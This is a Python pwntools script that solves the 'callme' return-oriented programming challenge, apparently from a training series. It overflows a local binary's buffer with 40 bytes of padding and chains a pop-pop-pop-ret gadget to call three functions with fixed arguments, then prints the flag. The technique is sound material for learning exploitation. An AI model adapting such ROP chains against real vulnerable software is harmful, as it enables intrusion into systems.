from pwn import *

bin = './callme'

elf = context.binary = ELF(bin, checksec=False)
context.log_level = 'info'

io = process(argv=[], executable=bin)

padding = 40
callmeone = 0x400720
callmetwo = 0x400740
callmethree = 0x4006f0
pop_pop_pop_ret = 0x000000000040093c
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d

ROPgadget_args = pack(pop_pop_pop_ret) + pack(arg1) + pack(arg2) + pack(arg3)

payload = flat(
    b'A' * padding,
    ROPgadget_args,
    pack(callmeone),
    ROPgadget_args,
    pack(callmetwo),
    ROPgadget_args,
    pack(callmethree)    
)

write('py_payload', payload)

io.sendlineafter(b'> ', payload)

# io.interactive()
io.recvuntil(b"callme_two() called correctly\n")

success(io.recvline().decode('utf-8'))
io.close()